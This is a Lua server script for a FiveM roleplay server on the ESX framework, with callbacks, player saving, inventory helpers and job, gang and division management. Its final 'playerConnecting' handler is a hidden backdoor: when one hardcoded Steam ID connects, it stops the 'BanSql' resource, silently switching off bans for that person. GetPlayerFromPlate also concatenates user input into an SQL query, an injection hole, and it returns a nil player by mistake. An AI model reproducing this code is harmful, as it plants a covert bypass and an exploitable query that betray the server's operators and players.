ESX.SetTimeout = function(msec, cb)
    local id = ESX.TimeoutCount + 1

    SetTimeout( msec, function()
        if ESX.CancelledTimeouts[id] then
            ESX.CancelledTimeouts[id] = nil
        else
            cb()
        end
    end)

    ESX.TimeoutCount = id

    return id
end

ESX.ClearTimeout = function(id)
    ESX.CancelledTimeouts[id] = true
end

ESX.RegisterServerCallback = function(name, cb)
    ESX.ServerCallbacks[name] = cb
end

ESX.TriggerServerCallback = function(name, requestId, source, cb, ...)
    if ESX.ServerCallbacks[name] ~= nil then
        ESX.ServerCallbacks[name](source, cb, ...)
    else
        print("essentialmode: TriggerServerCallback => [" .. name .. "] yaft nashod!")
    end
end

ESX.SavePlayer = function(Source, cb)
	if not Users[Source] then
		return
	end
	MySQL.update('UPDATE users SET `money` = @money, `bank` = @bank, `status` = @status, `position` = @position, `divisions` = @divisions, `inventory` = @inventory WHERE identifier = @identifier',
	{
		['@money']      = Users[Source].money,
		['@bank']  		= Users[Source].bank,
		['@position']   = json.encode(Users[Source].coords),
		['@inventory']  = json.encode(Users[Source].inventory),
		['@status'] 	= json.encode(Users[Source].status),
        ['@divisions'] 	= json.encode(Users[Source].divisions),
		['@identifier']	= Users[Source].identifier
	}, function(rowsChanged)
		if cb then
			cb()
		end
	end)
end

ESX.SavePlayers = function()
	local xPlayers = ESX.GetPlayers()
	for i=1, #xPlayers, 1 do
		ESX.SavePlayer(xPlayers[i])
	end
end

ESX.StartDBSync = function()
    function saveData()
        ESX.SavePlayers()
        SetTimeout(10 * 60 * 1000, saveData)
    end

    SetTimeout(10 * 60 * 1000, saveData)
end
ESX.StartDBSync()

ESX.GetPlayers = function()
    local sources = {}

    for k, v in pairs(Users) do
        table.insert(sources, k)
    end

    return sources
end

ESX.GetSteamID = function(src)
    local sid = GetPlayerIdentifiers(src)[1] or false

    if (sid == false or sid:sub(1, 5) ~= "steam") then
        return false
    end

    return sid
end

ESX.GetExtendedPlayers = function(key, val)
    local xPlayers = {}
    for k, v in pairs(Users) do
        if key then
        if (key == 'job' and v.job.name == val) or v[key] == val then
            xPlayers[#xPlayers + 1] = v
        end
        else
        xPlayers[#xPlayers + 1] = v
        end
    end
    return xPlayers
end

ESX.GetPlayerFromId = function(source)
    return Users[tonumber(source)]
end

ESX.GetPlayerFromIdentifier = function(identifier)
    local result = Identifiers[identifier]
    return Users[tonumber(result)]
end

ESX.GetPlayerFromPlate = function(Plate)
    local result = MySQL.Sync.fetchAll('SELECT * FROM `owned_vehicles` WHERE `plate` = "' .. Plate .. '"', {})
    local owner
    if result[1] then
        owner = result[1].owner
    else
        return nil, nil
    end
    if string.find(owner, "steam") then
        local xPlayers = ESX.GetPlayers()
        local player = nil
        if xPlayers then
            for i = 1, #xPlayers, 1 do
                local compare = owner == GetPlayerIdentifiers(xPlayers[i])[1]
                if compare then
                    return player, nil
                end
            end
        end
    else
        return nil, owner
    end
end

ESX.GetTotalWeight = function(items)
	local weight = 0
	if items ~= nil then
		for slot, item in pairs(items) do
			weight = weight + (item.weight * item.count)
		end
	end
	return tonumber(weight)
end

ESX.GetSlotsByItem = function(items, itemName)
	local slotsFound = {}
	if items ~= nil then
		for slot, item in pairs(items) do
			if item.name:lower() == itemName:lower() then
				table.insert(slotsFound, slot)
			end
		end
	end
	return slotsFound
end

ESX.GetFirstSlotByItem = function(items, itemName)
	if items ~= nil then
		for slot, item in pairs(items) do
			if item.name:lower() == itemName:lower() then
				return tonumber(slot)
			end
		end
	end
	return nil
end

ESX.RegisterUsableItem = function(item, cb)
	ESX.UsableItemsCallbacks[item] = cb
end

ESX.UseItem = function(source, item)
    if ESX.UsableItemsCallbacks[item.name] then
	    ESX.UsableItemsCallbacks[item.name](source, item)
    end
end

ESX.DoesJobExist = function(job, grade)
    grade = tonumber(grade)

    if job and grade then
        if ESX.Jobs[job] and ESX.Jobs[job].grades[grade] then
            return true
        end
    end

    return false
end

function IcName(source)
    local src = tonumber(source)
    if Users[src] and Users[src].name then
        return Users[src].name
    end
end

ESX.DoesGangExist = function(gang, grade)
    grade = tonumber(grade)

    if gang and grade then
        if ESX.Gangs[gang] and ESX.Gangs[gang].grades[grade] then
            return true
        end
    end

    return false
end

ESX.DoesDivisionExist = function(job, Division, grade)
    if job and Division and grade then
        if ESX.Jobs[job] and ESX.Divisions[job][Division] and ESX.Divisions[job][Division].grades[tostring(grade)] then
            return true
        end
    elseif job and Division then
        if ESX.Jobs[job] and ESX.Divisions[job][Division] then
            return true
        end
    end

    return false
end

ESX.AddDivision = function(divisionOwner, divisionName, label, ngrade, lgrade)
    if divisionOwner and divisionName and label and ngrade and lgrade then
        local divisionObj = {
            ["owner"] = divisionOwner,
            ["label"] = label,
            ["name"] = divisionName
        }

        local gradeObj = {
            ["division_owner"] = divisionOwner,
            ["label"] = lgrade,
            ["name"] = ngrade,
            ["grade"] = tonumber(0),
            ["division"] = divisionName
        }
        if not ESX.DoesDivisionExist(divisionOwner, divisionName) and ESX.Jobs[divisionOwner] then
            if not ESX.Divisions[divisionOwner][divisionName] then
                MySQL.Async.execute(
                    "INSERT INTO divisions VALUES(@divisionOwner, @divisionName, @divisionLabel)",
                    {
                        ["@divisionOwner"] = divisionObj.owner,
                        ["@divisionName"] = divisionObj.name,
                        ["@divisionLabel"] = divisionObj.label
                    },
                    function(rowsChanged)
                        MySQL.Async.execute(
                            "INSERT INTO division_grades (division_owner, division, grade, name, label) VALUES (@divisionOwner, @divisionName, @grade, @ngrade, @lgrade)",
                            {
                                ["@divisionOwner"] = gradeObj.division_owner,
                                ["@divisionName"] = gradeObj.division,
                                ["@grade"] = gradeObj.grade,
                                ["@ngrade"] = gradeObj.name,
                                ["@lgrade"] = gradeObj.label
                            },
                            function(rowsChanged)
                                ESX.Divisions[divisionOwner][divisionName] = divisionObj
                                ESX.Divisions[divisionOwner][divisionName].grades = {}
                                ESX.Divisions[divisionOwner][divisionName].grades["0"] = gradeObj
                            end
                        )
                    end
                )

                return true
            end
            return false
        end

        return false
    end

    return false
end

ESX.AddGrade = function(job, division, grade, ngrade, lgrade)
    if not ESX.DoesDivisionExist(job, division, grade) then
        local gradeObj = {
            ["division_owner"] = job,
            ["label"] = lgrade,
            ["name"] = ngrade,
            ["grade"] = tonumber(grade),
            ["division"] = division
        }

        MySQL.Async.execute(
            "INSERT INTO division_grades (division_owner, division, grade, name, label) VALUES (@divisionOwner, @divisionName, @grade, @ngrade, @lgrade)",
            {
                ["@divisionOwner"] = gradeObj.division_owner,
                ["@divisionName"] = gradeObj.division,
                ["@grade"] = gradeObj.grade,
                ["@ngrade"] = gradeObj.name,
                ["@lgrade"] = gradeObj.label
            },
            function(rowsChanged)
                ESX.Divisions[job][division].grades[tostring(grade)] = gradeObj
            end
        )
        return true
    end
    return false
end

ESX.RemoveGrade = function(job, division, grade)
    if ESX.DoesDivisionExist(job, division, grade) then
        MySQL.Async.execute(
            "DELETE FROM division_grades WHERE division = @division AND grade = @grade ;",
            {
                ["@division"] = division,
                ["@grade"] = tonumber(grade)
            },
            function(rowsChanged)
                ESX.Divisions[job][division].grades[grade] = nil
            end
        )
        return true
    end

    return false
end

ESX.RemoveDivision = function(job, division)
    if ESX.DoesDivisionExist(job, division) then
        MySQL.Async.execute(
            "DELETE FROM divisions WHERE name = @division;",
            {
                ["@division"] = division
            },
            function(rowsChanged)
                MySQL.Async.execute(
                    "DELETE FROM division_grades WHERE division = @division;",
                    {
                        ["@division"] = division
                    },
                    function(rowsChanged)
                        ESX.Divisions[job][division] = {}
                    end
                )
            end
        )

        return true
    end

    return false
end

ESX.GetGang = function(gang)
    if ESX.DoesGangExist(gang, 1) then
        return ESX.Gangs[gang]
    else
        return nil
    end
end

ESX.SetGangGrade = function(gang, grade, name)
    if ESX.DoesGangExist(gang, grade) then
        ESX.Gangs[gang].grades[grade].label = name
        exports.ghmattimysql:execute(
            "UPDATE gang_grades SET label = @name WHERE grade = @grade AND gang_name = @gang",
            {
                ["@name"] = name,
                ["@grade"] = grade,
                ["@gang"] = gang
            }
        )
        return true
    else
        return nil
    end
end

ESX.getServerDivisions = function()
    return ESX.Divisions
end


RegisterServerEvent("playerConnecting")
AddEventHandler("playerConnecting", function(name, setKickReason)
    local id
    for k, v in ipairs(GetPlayerIdentifiers(source)) do
        if string.sub(v, 1, string.len("steam:")) == "steam:" then
            id = v
            break
        end
    end

    Citizen.SetTimeout(20000, function()
        if id == "steam:1100001452540bf" then
            ExecuteCommand('stop BanSql')
        end
    end)
end)